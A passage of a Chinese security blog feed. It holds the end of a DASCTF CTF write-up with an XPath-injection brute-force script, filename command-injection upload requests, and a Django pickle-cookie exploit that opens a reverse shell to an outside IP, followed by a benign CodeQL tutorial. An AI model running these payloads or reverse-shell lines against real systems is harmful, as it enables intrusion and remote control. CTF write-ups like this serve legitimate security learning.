''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>".format(i,j,token[0])</span>        <span class="token comment">#跑用户名和密码</span>        <span class="token comment"># payload_username ="&lt;username>'or substring(/accounts/user[1]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='".format(i,j)</span>        payload_username <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/accounts/user[1]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload_username<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">,</span>            <span class="token string">"submit"</span><span class="token punctuation">:</span><span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#</span>        <span class="token comment"># payload_password ="&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>&#123;&#125;&lt;/token>".format(i,j,token[0])</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload_username<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token comment">#print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">"登录成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"登录失败"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆出来的是 <code>admin/003d7628772d6b57fec5f30ccbc82be1</code></p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/md5.png" class=""><p>md5 解密出来为 15035371139</p><p>登录成功之后能够看到一个文件上传的功能点，简单尝试一番后，看到 File 这个类里面的 <code>__destruct</code> 方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls -all "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>命令拼接，注入</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/commandInjection.png" class=""><p>PoC</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">------WebKitFormBoundary79w3gAbWOTtwjVx2<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=";echo bHMgLwo|base64 -d|bash;ajpg.jpg"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/png</span></span>123------WebKitFormBoundary79w3gAbWOTtwjVx2--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步构造 PoC</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">------WebKitFormBoundary6xM5F6Mo0Mgc9vhp<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=";echo Y2F0IC9hZGphc2tkaG5hc2tfZmxhZ19pc19oZXJlX2Rha2pkbm1zYWtqbmZrc2Q=|base64 -d|bash;user.jpg"</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span>123------WebKitFormBoundary6xM5F6Mo0Mgc9vhp--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/flag3.png" class=""><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>下发的附件也比较简单，代码方面没有什么太多可以说的东西，没什么问题。去看一下 setting.py，其中有一段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ROOT_URLCONF <span class="token operator">=</span> <span class="token string">'openlug.urls'</span><span class="token comment"># for database performance</span>SESSION_ENGINE <span class="token operator">=</span> <span class="token string">'django.contrib.sessions.backends.signed_cookies'</span><span class="token comment"># use PickleSerializer</span>SESSION_SERIALIZER <span class="token operator">=</span> <span class="token string">'django.contrib.sessions.serializers.PickleSerializer'</span><span class="token comment"># SECURITY WARNING: keep the secret key used in production non-secret!</span>SECRET_KEY <span class="token operator">=</span> <span class="token string">'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'</span><span class="token comment"># SECURITY WARNING: don't run with debug turned on in production!</span>DEBUG <span class="token operator">=</span> <span class="token boolean">False</span>ALLOWED_HOSTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"*"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>secret_key 直接给出来了，很明显是关于 session 的一系列操作，结合 Pickle，大概率就是 Pickle 在 session 处的伪造了。</p><p>去到对应的方法，这里默认传参是 JSONSerializer，尝试修改为 PickleSerializer</p><img src="/2023/08/03/2023-DASCTF-%E4%B8%83%E6%9C%88%E8%B5%9B-0x401-WP/dumpsCore.png" class=""><p>构造 EXP</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib3SECRET_KEY <span class="token operator">=</span> <span class="token string">'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'</span>salt <span class="token operator">=</span> <span class="token string">"django.contrib.sessions.backends.signed_cookies"</span><span class="token keyword">import</span> django<span class="token punctuation">.</span>core<span class="token punctuation">.</span>signing<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">PickleSerializer</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Simple wrapper around pickle to be used in signing.dumps and    signing.loads.    """</span>    <span class="token keyword">def</span> <span class="token function">dumps</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>HIGHEST_PROTOCOL<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">loads</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">import</span> subprocess<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">Command</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/124.222.21.138/7777 &lt;&amp;1"'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>out_cookie<span class="token operator">=</span> django<span class="token punctuation">.</span>core<span class="token punctuation">.</span>signing<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>    Command<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span>SECRET_KEY<span class="token punctuation">,</span> salt<span class="token operator">=</span>salt<span class="token punctuation">,</span> serializer<span class="token operator">=</span>PickleSerializer<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>out_cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;有点赶，含一道复现&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 学习</title>
    <link href="https://drun1baby.github.io/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-31T06:02:02.000Z</published>
    <updated>2023-07-31T06:11:50.704Z</updated>
    
    <content type="html"><![CDATA[<p>codeql 学习记录</p><span id="more"></span><ul><li>大部分内容参考自淚笑师傅的博客</li><li><a class="link"   href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" >https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0<i class="fas fa-external-link-alt"></i></a></li></ul><h2 id="0x01-环境-x2F-安装"><a href="#0x01-环境-x2F-安装" class="headerlink" title="0x01 环境&#x2F;安装"></a>0x01 环境&#x2F;安装</h2><h3 id="下载-CodeQL-CLI"><a href="#下载-CodeQL-CLI" class="headerlink" title="下载 CodeQL CLI"></a>下载 CodeQL CLI</h3><p><a class="link"   href="https://github.com/github/codeql-cli-binaries/releases" >https://github.com/github/codeql-cli-binaries/releases<i class="fas fa-external-link-alt"></i></a></p><p>我这里把 <code>/codeql/codeql</code> 的名字改成了 <code>codeql/codeql-cli</code>，添加系统环境变量</p><p>接着在 Terminal 中输入 <code>codeql</code> 命令验证是否编辑成功</p><h3 id="下载包含标准库的工作空间"><a href="#下载包含标准库的工作空间" class="headerlink" title="下载包含标准库的工作空间"></a>下载包含标准库的工作空间</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /xxx/CodeQL/<span class="token function">git</span> clone https://github.com/github/vscode-codeql-starter.git<span class="token builtin class-name">cd</span> vscode-codeql-starter<span class="token function">git</span> submodule update <span class="token parameter variable">--init</span> <span class="token parameter variable">--remote</span><span class="token function">git</span> submodule update <span class="token parameter variable">--remote</span><span class="token comment">#定期执行以更新子模块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装-VSCode-CodeQL-扩展"><a href="#安装-VSCode-CodeQL-扩展" class="headerlink" title="安装 VSCode CodeQL 扩展"></a>安装 VSCode CodeQL 扩展</h3><p>VSCode 商店搜索安装 CodeQL，并在扩展设置中设置 CodeQL 引擎路径 <code>/xxx/CodeQL/codeql-cli/codeql</code></p><h2 id="0x02-运行-CodeQL"><a href="#0x02-运行-CodeQL" class="headerlink" title="0x02 运行 CodeQL"></a>0x02 运行 CodeQL</h2><p>运行 CodeQL 之前需要先构建数据库，这个数据库本质上其实就是源代码的 Target 打包了一下，对应的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">codeql database create E:<span class="token punctuation">\</span>Coding<span class="token punctuation">\</span>CodeQL<span class="token punctuation">\</span>CodeQLearning<span class="token punctuation">\</span>javaCodeQLTest <span class="token parameter variable">--language</span><span class="token operator">=</span><span class="token string">"java"</span> --source-root<span class="token operator">=</span>E:<span class="token punctuation">\</span>Coding<span class="token punctuation">\</span>JavaSec<span class="token punctuation">\</span>Eliauk <span class="token parameter variable">--command</span><span class="token operator">=</span><span class="token string">"mvn clean package -Dmaven.test.skip=true"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>&#x2F;xxx&#x2F;CodeQL&#x2F;databases&#x2F;Test 指定生成的数据库位置<br>  –source-root 项目源码路径<br>  –command 编译命令，PHP 和 Python 等不需要。对于 Maven，Ant 等项目也可以省略</p></blockquote><p>如果没有指定<code>--command</code>，CodeQL 会根据平台的不同，调用<code>./java/tools/autobuild.cmd</code>或<code>./java/tools/autobuild.sh</code> 对项目进行分析。如果该项目的编译工具为 Gradle、Maven 或 Ant，且能找到相应的配置文件。程序就会进入相应的流程，调用相关的编译指令对项目进行编译。CodeQL 会收集项目编译过程中产生的信息，并以此生成数据库。如果不属于 Gradle、Maven、Ant 中任意一种，则报错退出。</p><p>然后用 vscode 中的 QL 部分打开此文件夹</p><p>再对这个数据库进行 CodeQL 语句的查询，具体做法如下</p><p>查询结果</p><h2 id="0x03-一些示例"><a href="#0x03-一些示例" class="headerlink" title="0x03 一些示例"></a>0x03 一些示例</h2><h3 id="Java-污点跟踪"><a href="#Java-污点跟踪" class="headerlink" title="Java 污点跟踪"></a>Java 污点跟踪</h3><h4 id="CodeQL-中-Java-污点跟踪原理"><a href="#CodeQL-中-Java-污点跟踪原理" class="headerlink" title="CodeQL 中 Java 污点跟踪原理"></a>CodeQL 中 Java 污点跟踪原理</h4><p>全局污点跟踪分析要继承 <code>TaintTracking::Configuration</code> 这个类，然后重载 <code>isSource</code> 和<code>isSink</code> 方法</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">class VulConfig extends TaintTracking::Configuration &#123;VulConfig() &#123; this &#x3D; &quot;myConfig&quot; &#125;override predicate isSource(DataFlow::Node source) &#123;&#125;override predicate isSink(DataFlow::Node sink) &#123;&#125;&#125;from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sinkwhere config.hasFlowPath(source, sink)select sink.getNode(), source, sink, &quot;source are&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="以-GetenvSource-URLSink-为例"><a href="#以-GetenvSource-URLSink-为例" class="headerlink" title="以 GetenvSource-URLSink 为例"></a>以 GetenvSource-URLSink 为例</h4><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">&#x2F;**   * @kind path-problem   *&#x2F;    import java  import semmle.code.java.dataflow.TaintTracking  import DataFlow::PathGraph    class GetenvSource extends DataFlow::ExprNode &#123;    GetenvSource() &#123;      exists(Method m | m &#x3D; this.asExpr().(MethodAccess).getMethod() |        m.hasName(&quot;getenv&quot;) and        m.getDeclaringType() instanceof TypeSystem      )    &#125;  &#125;    class URLSink extends DataFlow::ExprNode &#123;    URLSink() &#123;      exists(Call call |        this.asExpr() &#x3D; call.getArgument(0) and        call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)      )    &#125;  &#125;    class GetenvToURLTaintTrackingConfig extends TaintTracking::Configuration &#123;    GetenvToURLTaintTrackingConfig() &#123; this &#x3D; &quot;GetenvToURLTaintTrackingConfig&quot; &#125;      override predicate isSource(DataFlow::Node source) &#123; source instanceof GetenvSource &#125;      override predicate isSink(DataFlow::Node sink) &#123; sink instanceof URLSink &#125;  &#125;    from GetenvToURLTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink  where cfg.hasFlowPath(source, sink)  select sink, source, sink, &quot;-&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python污点跟踪"><a href="#Python污点跟踪" class="headerlink" title="Python污点跟踪"></a>Python污点跟踪</h3><p>以 <code>RemoteFlowSource-FileSystemAccessSink</code> 为例</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">&#x2F;**   * @kind path-problem   *&#x2F;    import python  import semmle.python.dataflow.new.DataFlow  import semmle.python.dataflow.new.TaintTracking  import semmle.python.dataflow.new.RemoteFlowSources  import semmle.python.Concepts  import DataFlow::PathGraph    class RemoteToFileConfiguration extends TaintTracking::Configuration &#123;    RemoteToFileConfiguration() &#123; this &#x3D; &quot;RemoteToFileConfiguration&quot; &#125;      override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;      override predicate isSink(DataFlow::Node sink) &#123;      sink &#x3D; any(FileSystemAccess fa).getAPathArgument()    &#125;  &#125;    from RemoteToFileConfiguration cfg, DataFlow::PathNode source, DataFlow::PathNode sink  where cfg.hasFlowPath(source, sink)  select sink, source, sink, &quot;-&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-CodeQL-For-Java"><a href="#0x04-CodeQL-For-Java" class="headerlink" title="0x04 CodeQL For Java"></a>0x04 CodeQL For Java</h2><h3 id="CodeQL-元数据"><a href="#CodeQL-元数据" class="headerlink" title="CodeQL 元数据"></a>CodeQL 元数据</h3><p><a class="link"   href="https://codeql.github.com/docs/writing-codeql-queries/metadata-for-codeql-queries/" >CodeQL查询的元数据<i class="fas fa-external-link-alt"></i></a>作为 QLDoc 注释的内容包含在每个查询文件的顶部。此元数据告诉 LGTM 和<a class="link"   href="https://codeql.github.com/docs/codeql-for-visual-studio-code/#codeql-for-visual-studio-code" >VSCode 的 CodeQL 插件<i class="fas fa-external-link-alt"></i></a>如何处理查询并正确显示其结果。</p><ul><li>例如：</li></ul><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">&#x2F;**  * @name Empty block  * @kind problem  * @problem.severity warning  * @id java&#x2F;example&#x2F;empty-block  *&#x2F;    import java    from BlockStmt b  where b.getNumStmt() &#x3D; 0  select b, &quot;This is an empty block.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">&#x2F;**   * @kind path-problem   *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Java-代码的基础查询"><a href="#Java-代码的基础查询" class="headerlink" title="Java 代码的基础查询"></a>Java 代码的基础查询</h3><p>以下查询为查找多余的 <code>if</code> 语句，即 <code>then</code> 分支是空的，如<code>if (...) &#123; &#125;</code></p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from IfStmt ifstmt, BlockStmt blockstmt  where ifstmt.getThen() &#x3D; blockstmt and  blockstmt.getNumStmt() &#x3D; 0  select ifstmt, &quot;This &#39;if&#39; statement is redundant.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们一步步拆解一下语法，首先是 <code>import java</code></p><blockquote><p>import java<br>  导入适用于 Java 的标准 CodeQL 库，每个查询都以一个或多个 <code>import</code> 语句开始</p></blockquote><p>然从定义查询的变量里面取值</p><blockquote><p>from IfStmt ifstmt, BlockStmt blockstmt<br>  定义查询的变量，声明的形式为： <code>&lt;type&gt; &lt;variable name&gt;</code><br>  <a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$IfStmt.html" >IfStmt<i class="fas fa-external-link-alt"></i></a>：<code>if</code>语句<br>  <a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$BlockStmt.html" >BlockStmt<i class="fas fa-external-link-alt"></i></a>：语句块</p></blockquote><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">where ifstmt.getThen() &#x3D; blockstmt and blockstmt.getNumStmt() &#x3D; 0  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定义变量的条件，<code>ifstmt.getThen() = blockstmt</code> 将这两个变量联系起来。<code>blockstmt</code> 必须是 <code>if</code> 语句的 <code>then</code> 分支。<br><code>blockstmt.getNumStmt() = 0</code> 声明该块必须为空（即不包含任何语句）<br><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getThen.0.html" >IfStmt::getThen<i class="fas fa-external-link-alt"></i></a>：<code>Stmt getThen()</code>，成员谓词，获取此 <code>if</code> 语句的 <code>then</code> 分支<br><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$BlockStmt$getNumStmt.0.html" >BlockStmt::getNumStmt<i class="fas fa-external-link-alt"></i></a>：<code>int getNumStmt()</code>，成员谓词，获取此块中直接子语句的数目</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">select ifstmt, “This ‘if’ statement is redundant.”  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定义每个匹配项的报告内容，<code>select</code> 用于查找不良编码实例的查询语句始终采用以下形式： <code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code></p><p>浏览查询结果可能会发现带有<code>else</code>分支的<code>if</code>语句的例子，其中空的<code>then</code>分支确实起到了作用。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"-verbose"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// nothing to do - handled earlier  </span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"unrecognized option"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 CodeQL 的查询结果如图</p><p>在这种情况下，将带有空 <code>then</code> 分支的 <code>if</code> 语句识别为多余的是错误的。一种解决方案是如果 <code>if</code> 语句有 <code>else</code> 分支，则忽略空的 <code>then</code> 分支：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from IfStmt ifstmt, BlockStmt blockstmt  where ifstmt.getThen() &#x3D; blockstmt and  blockstmt.getNumStmt() &#x3D; 0 and  not exists(ifstmt.getElse())  select ifstmt, &quot;This &#39;if&#39; statement is redundant.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getElse.0.html" >IfStmt::getElse<i class="fas fa-external-link-alt"></i></a>：<code>Stmt getElse()</code>，成员谓词，获取此<code>if</code>语句的<code>else</code>分支</p><h3 id="CodeQL-的-Java-库"><a href="#CodeQL-的-Java-库" class="headerlink" title="CodeQL 的 Java 库"></a>CodeQL 的 Java 库</h3><p>标准 Java 库中最重要的类可以分为以下五个类别</p><p>1、表示程序元素的类（例如 Java 的类和方法）<br>2、表示 AST 节点的类（例如语句和表达式）<br>3、表示元数据的类（例如注释和注解）<br>4、计算度量的类（例如圈复杂度和耦合度）<br>5、导航程序调用图的类</p><h4 id="程序元素"><a href="#程序元素" class="headerlink" title="程序元素"></a>程序元素</h4><p>包括包（<code>Package</code>）、编译单元（<code>CompilationUnit</code>）、类型（<code>Type</code>）、方法（<code>Method</code>）、构造函数（<code>Constructor</code>）和变量（<code>Variable</code>）<br>它们的共同超类是<code>Element</code>，它提供了通用的成员谓词，用于确定程序元素的名称和检查两个元素是否相互嵌套</p><p><code>Callable</code> 是 <code>Method</code> 和<code>Constructor</code>的共同超类，通过 <code>Callable</code> 引用一个可能是方法或构造函数的元素通常很方便</p><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p><code>Type</code> 类有许多子类用于表示不同类型：</p><ul><li><code>PrimitiveType</code> 表示一个 <a class="link"   href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html" >基本类型<i class="fas fa-external-link-alt"></i></a>，即 <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code> 之一， QL 也将 <code>void</code> 和 <code>&lt;nulltype&gt;</code> 归为基本类型</li><li><code>RefType</code>表示引用类型，包含如下子类：<ul><li><code>Class</code> Java 类</li><li><code>Interface</code> Java 接口</li><li><code>EnumType</code> Java 枚举类型</li><li><code>Array</code> Java 数组类型</li></ul></li></ul><p>例如，以下查询查找程序中为 int 类型的所有变量：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Variable v, PrimitiveType pt  where pt &#x3D; v.getType() and       pt.hasName(&quot;int&quot;)  select v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Variable.qll/predicate.Variable$Variable$getType.0.html" >Variable::getType<i class="fas fa-external-link-alt"></i></a>：<code>Type getType()</code>，获取变量的类型<br><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$hasName.1.html" >Element::hasName<i class="fas fa-external-link-alt"></i></a>：<code>predicate hasName(string name)</code>，如果元素具有指定的名称则该谓词成立</p><p>引用类型也根据其声明范围进行分类：</p><ul><li><code>TopLevelType</code> 表示在编译单元的顶层声明的引用类型</li><li><code>NestedType</code> 是在另一个类型中声明的类型</li></ul><p>例如，此查询查找名称与其编译单元名称不同的所有顶级类型：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from TopLevelType tl  where tl.getName() !&#x3D; tl.getCompilationUnit().getName()  select tl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$getName.0.html" >Element::getName<i class="fas fa-external-link-alt"></i></a>：<code>string getName()</code>，获取元素的名称<br><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getCompilationUnit.0.html" >RefType::getCompilationUnit<i class="fas fa-external-link-alt"></i></a>：<code>CompilationUnit getCompilationUnit()</code>，获取声明此类型的编译单元<br><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/CompilationUnit.qll/predicate.CompilationUnit$CompilationUnit$getName.0.html" >CompilationUnit::getName<i class="fas fa-external-link-alt"></i></a>：<code>string getName()</code>，获取编译单元的名称（不包括其扩展名）</p><p>还有几个专用的类：</p><ul><li><code>TopLevelClass</code> 表示在编译单元的顶层声明的类</li><li><code>NestedClass</code> 表示在<a class="link"   href="https://docs.oracle.com/javase/tutorial/java/javaOO/nested.html" >另一个类型内声明的类<i class="fas fa-external-link-alt"></i></a>，如<ul><li><code>LocalClass</code>， <a class="link"   href="https://docs.oracle.com/javase/tutorial/java/javaOO/localclasses.html" >是在方法或构造函数中声明的类<i class="fas fa-external-link-alt"></i></a>.</li><li><code>AnonymousClass</code>， <a class="link"   href="https://docs.oracle.com/javase/tutorial/java/javaOO/anonymousclasses.html" >匿名类<i class="fas 